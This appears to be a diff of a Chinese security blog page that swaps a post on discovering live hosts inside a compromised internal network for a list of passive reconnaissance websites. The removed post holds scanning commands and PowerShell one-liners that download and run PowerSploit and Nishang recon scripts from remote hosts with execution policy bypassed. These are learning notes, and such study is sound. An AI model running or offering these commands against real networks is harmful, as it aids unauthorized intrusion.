@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>信息收集--主机存活 | Beret-81</title>
-  <meta name="keywords" content=" 信息收集、学习记录 ">
-  <meta name="description" content="信息收集--主机存活 | Beret-81">
+  <title>被动信息收集--在线网站 | Beret-81</title>
+  <meta name="keywords" content=" 渗透测试、信息收集 ">
+  <meta name="description" content="被动信息收集--在线网站 | Beret-81">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="域内信息收集 确定了当前内网拥有的域，并且所控制的主机在域里面，就可以进行域内相关信息的收集了。因为这些查询命令本质上都是通过 LDAP 协议去域控制器上查询的，查询时候需要经过权限认证，只有域用户才有这个权限，所以本地用户是无法运行以下命令的（system 权限用户除外。在域里面，除了普通用户，所有机器都有一个机器用户，用户名为机器名加“$”。system 用户对应的就是域里面的机器用户，所以">
 <meta property="og:type" content="article">
@@ -313,9 +313,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-信息收集-主机存活" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-被动信息收集-在线网站" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">信息收集--主机存活</h1>
+        <h1 class="article-title">被动信息收集--在线网站</h1>
     
     <div class="article-meta">
         
@@ -325,7 +325,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="内网渗透">内网渗透</a>
+            <a  data-rel="渗透测试">渗透测试</a>
             
         </span>
         
@@ -333,14 +333,14 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">信息收集、学习记录</a>
+            <a class="color5">渗透测试、信息收集</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-25 21:24:55'>2020-01-26 13:06</time>
+            Created At : <time class="date" title='Updated At: 2020-07-29 17:37:09'>2019-12-04 12:53</time>
         
     </div>
     <div class="article-meta">
@@ -362,7 +362,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#探测内网存活主机"><span class="toc-text">探测内网存活主机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-利用-NetBIOS-快速探测内网"><span class="toc-text">1.利用 NetBIOS 快速探测内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-利用-ICMP-协议快速探测内网"><span class="toc-text">2.利用 ICMP 协议快速探测内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-利用-ARP-扫描探测内网"><span class="toc-text">3.利用 ARP 扫描探测内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-利用-TCP-UDP-端口扫描探测内网"><span class="toc-text">4.利用 TCP&#x2F;UDP 端口扫描探测内网</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#被动信息收集–在线网站"><span class="toc-text">被动信息收集–在线网站</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、网络空间资产搜索"><span class="toc-text">1、网络空间资产搜索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、WEB-指纹信息类"><span class="toc-text">2、WEB 指纹信息类</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -378,84 +378,20 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h1><blockquote>
-<p>内网存活主机的探测是内网渗透中不可或缺的一个环节。在扫描的时候，应尽量避免使用 Namp 等工具进行暴力扫描.要尽量使用目标系统自带的各种工具，推荐使用 PowerShell 脚本。对于 Windows 7 以下版本的系统，可以使用 VBS 脚本。在探测时，可在白天和夜间分别探测，以对比分析存活主机和对应的 IP 地址。</p>
-</blockquote>
-<h3 id="1-利用-NetBIOS-快速探测内网"><a href="#1-利用-NetBIOS-快速探测内网" class="headerlink" title="1.利用 NetBIOS 快速探测内网"></a>1.利用 NetBIOS 快速探测内网</h3><blockquote>
-<p>NetBIOS 是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求 低级服务的统一的命令集，作用是给局域网提供网络及其他特殊功能。几乎所有的局域网都是在 NetBIOS 协议的基础上工作的。“NetBIOS”也是计算机的标识名，该名字主要用于局域网中计算 机之间的相互访问。NetBIOS 的工作流程是正常的机器名解析查询应答过程，推荐优先使用。 nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。 nbtscan 有 Windows 版本和 Linux 版本，体积很小，且不需要特殊的库或 DLL。 NetBIOS 的使用比较简单。将其上传到目标主机后，直接输入IP 地址范围并运行。</p>
-</blockquote>
-<p> 工具下载链接:<a href="http://www.unixwiz.net/tools/nbtscan.html" target="_blank" rel="noopener">http://www.unixwiz.net/tools/nbtscan.html</a></p>
-<pre><code>C:\Windows\Temp&gt;nbtscan.exe 192.168.3.0/24
-192.168.3.68    0DAY\SRV-DB-0DAY                SHARING
-192.168.3.142   0DAY\OWA2010SP3                 SHARING DC
-*timeout (normal end of scan)</code></pre><h3 id="2-利用-ICMP-协议快速探测内网"><a href="#2-利用-ICMP-协议快速探测内网" class="headerlink" title="2.利用 ICMP 协议快速探测内网"></a>2.利用 ICMP 协议快速探测内网</h3><pre><code>1.使用命令行
-  for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;
+        <h1 id="被动信息收集–在线网站"><a href="#被动信息收集–在线网站" class="headerlink" title="被动信息收集–在线网站"></a>被动信息收集–在线网站</h1><h2 id="1、网络空间资产搜索"><a href="#1、网络空间资产搜索" class="headerlink" title="1、网络空间资产搜索"></a>1、网络空间资产搜索</h2><ul>
+<li><a href="https://fofa.so/" target="_blank" rel="noopener" title="fofa">FOFA</a></li>
+<li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener" title="ZoomEye">ZoomEye</a></li>
+<li><a href="https://www.shodan.io/" target="_blank" rel="noopener" title="shodan">Shodan</a></li>
+</ul>
+<h2 id="2、WEB-指纹信息类"><a href="#2、WEB-指纹信息类" class="headerlink" title="2、WEB 指纹信息类"></a>2、WEB 指纹信息类</h2><ul>
+<li><a href="https://www.yunsee.cn/" target="_blank" rel="noopener" title="yunsee">Yunsee</a></li>
+<li><a href="http://finger.tidesec.net/home/index/index.html" target="_blank" rel="noopener" title="tidesec">Tidesec</a></li>
+<li><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener" title="bugscaner">Bugscaner</a></li>
+<li><a href="https://scan.top15.cn/web/" target="_blank" rel="noopener" title="TScan">TScan</a></li>
+<li><a href="https://whatcms.org/" target="_blank" rel="noopener" title="whatcms">Whatcms</a></li>
+<li><a href="https://whatweb.net/" target="_blank" rel="noopener" title="whatweb">Whatweb</a></li>
+</ul>
 
-C:\Windows\Temp&gt;for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot;
-来自 192.168.3.68 的回复: 字节=32 时间&lt;1ms TTL=128
-来自 192.168.3.142 的回复: 字节=32 时间&lt;1ms TTL=128 
-
-2.使用bat 脚本
- @echo off
- FOR /L %%I in (1,1,255) do ping 192.168.1.%%I -n 1 -w 100
- arp -a &gt; C:\Users\beret\1.txt
- exit
-
-3.使用 VBS 脚本
- strSubNet = &quot;192.168.3.&quot;  
- Set objFSO= CreateObject(&quot;Scripting.FileSystemObject&quot;)  
- Set objTS = objfso.CreateTextFile(&quot;C:\Windows\Temp\Result.txt&quot;)   
- For i = 1 To 254  
- strComputer = strSubNet &amp; i  
- blnResult = Ping(strComputer)  
- If blnResult = True Then  
- objTS.WriteLine strComputer &amp; &quot; is alived ! :) &quot;  
- End If  
- Next   
- objTS.Close  
- WScript.Echo &quot;All Ping Scan , All Done ! :) &quot;    
- Function Ping(strComputer)  
- Set objWMIService = GetObject(&quot;winmgmts:\\.\root\cimv2&quot;) 
- Set colItems = objWMIService.ExecQuery(&quot;Select * From Win32_PingStatus Where Address=&apos;&quot; &amp; strComputer &amp; &quot;&apos;&quot;) 
- For Each objItem In colItems  
- Select case objItem.StatusCode  
- Case 0  
- Ping = True  
- Case Else  
- Ping = False  
- End select  
- Exit For  
- Next  
- End Function </code></pre><h3 id="3-利用-ARP-扫描探测内网"><a href="#3-利用-ARP-扫描探测内网" class="headerlink" title="3.利用 ARP 扫描探测内网"></a>3.利用 ARP 扫描探测内网</h3><pre><code>1.使用arp-scan 工具
-C:\Windows\Temp&gt;arp-scan.exe -t 192.168.3.0/24
-Reply that 00:0C:29:72:B1:AC is 192.168.3.68 in 0.113632
-Reply that 00:0C:29:61:53:54 is 192.168.3.71 in 11.915900
-Reply that 00:0C:29:91:86:D1 is 192.168.3.142 in 1.021149
-Reply that 00:0C:29:72:B1:AC is 192.168.3.255 in 0.044419
-
-2.Nishang 中的 Invoke-ARPScan.ps1 脚本
-
-C:\Windows\Temp&gt;powershell.exe -exec bypass -Command &quot;&amp; {Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.3.0/24}&quot;
-
-MAC                                                         Address
----                                                         -------
-00:0C:29:72:B1:AC                                           192.168.3.68
-00:0C:29:61:53:54                                           192.168.3.71
-00:0C:29:91:86:D1                                           192.168.3.142
-00:0C:29:72:B1:AC                                           192.168.3.255
-
-a. 本地加载运行
-powershell.exe -exec bypass -Command &quot;&amp; {Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.3.0/24}&quot; &gt;&gt; C:\windows\temp\log.txt
-b. 远程下载运行
-powershell.exe -nop -exec bypass &quot;IEX (New-ObjectNet.WebClient).DownloadString(&apos;http://192.168.100.200/Recon/Invoke-ARPScan.ps1&apos;);Invoke-ARPScan-CIDR 192.168.3.0/20&quot; &gt;&gt; C:\windows\temp\log.txt
-c. 无条件运行
-powershell.exe -nop -exec bypass &quot;IEX (New-ObjectNet.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&apos;);Invoke-Portscan-Hosts 192.168.3.0/24-T 4 -ports&apos;80,445,1433,3389,8080&apos;-oA C:\windows\temp\res.txt&quot;
-3.使用Empire 中的 arpsan 模块
-Empire 内置了 arpsan 模块。该模块用于在局域网内发送 ARP 数据包，收集活跃主机 IP 地址和 MAC 地址信息。
-输入“usemodule situational_awareness/network/arpscan”命令，即可使用 arpsan 模块，</code></pre><h3 id="4-利用-TCP-UDP-端口扫描探测内网"><a href="#4-利用-TCP-UDP-端口扫描探测内网" class="headerlink" title="4.利用 TCP/UDP 端口扫描探测内网"></a>4.利用 TCP/UDP 端口扫描探测内网</h3><blockquote>
-<p>ScanLine 是一款经典的端口扫描工具，Windows 全版本通用，体积小，仅使用单个文件，同时支持对 TCP/UDP 的端口扫描，命令如下:</p>
-</blockquote>
-<pre><code>scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.3.1-254 /b</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源。 </span>
     </div>
